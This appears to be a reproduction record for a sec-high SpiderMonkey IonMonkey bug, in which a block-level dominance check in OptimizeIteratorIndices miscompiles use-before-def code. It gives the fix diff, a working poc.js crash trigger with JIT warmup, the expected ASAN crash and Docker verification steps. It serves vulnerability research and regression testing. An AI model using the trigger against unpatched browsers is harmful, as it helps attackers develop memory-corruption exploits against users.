# Bugzilla 2013543

**Title:** IonMonkey `OptimizeIteratorIndices` block-level-vs-instruction-level dominance miscompilation
**Severity:** sec-high (bug access-restricted; tagged sec-high in mozilla-central)
**Component:** SpiderMonkey — IonMonkey — `js/src/jit/IonAnalysis.cpp` (`OptimizeIteratorIndices`)
**Fix commit:** `bf98f12eb281d60b77984d9497a08209c69ad8d8`
**Vulnerable revision:** `bf98f12eb281d60b77984d9497a08209c69ad8d8~1`

## Summary

`OptimizeIteratorIndices` tries to share the `Object.keys(obj)` array
between neighbouring JIT blocks when the second iterator dominates the
first. Pre-fix, the check used *block-level* dominance —
`otherIter->block()->dominates(ins->block())` — which is true when the
blocks are the same basic block, but ignores intra-block instruction
ordering. If `ins` happens to appear *before* `otherIter` inside the
same block, the optimization fires on a use-before-def, which trips
`AssertExtendedGraphCoherency` / `MBasicBlock::dominates` invariants
after the IR rewrite and produces a miscompiled graph that the Ion
backend asserts on.

## Fix

```cpp
// js/src/jit/IonAnalysis.cpp
- if (otherIter->block()->dominates(ins->block())) { ... }
+ if (otherIter->dominates(ins)) { ... }
```

`MInstruction::dominates()` compares instruction indices within the
same block before falling back to block-level dominance, so
use-before-def is no longer mistakenly treated as dominance.

## Trigger (`poc.js`)

```js
function foo(obj1, obj2) {
  var keys1 = Object.keys(obj1);
  var val = obj2[keys1[0]];
  var keys2 = Object.keys(obj2);
  return val;
}

var objs = [];
for (var i = 0; i < 30; i++) {
  var o = {};
  for (var j = 0; j <= i; j++) {
    o["p" + j] = j + 1;
  }
  objs.push(o);
}

for (var i = 0; i < 5000; i++) {
  var o = objs[i % objs.length];
  foo(o, o);
}
```

5000 warmup calls guarantee Ion compilation. `foo` contains two
`Object.keys` calls separated by a dependent element load
(`obj2[keys1[0]]`) — the shape that makes
`OptimizeIteratorIndices` attempt to share iterators between
block-level-dominant but instruction-level-non-dominant positions.

## Expected crash

ASAN **SEGV / MOZ_CRASH** at
`js::jit::AssertExtendedGraphCoherency`
(`IonAnalysis.cpp:3576`) invoked from
`OptimizeIteratorIndices`'s post-pass `AccountForCFGChanges`,
propagated into `js::jit::CompileBackEnd` and surfaced as
`MOZ_CrashSequence` SEGV.

## Verification

```sh
docker build -t hwiwonlee/sm.x86_64:2013543 spidermonkey/2013543
bash spidermonkey/crash_check.sh 2013543
```

Expected: `CONFIMRED: ASAN_CRASH`.
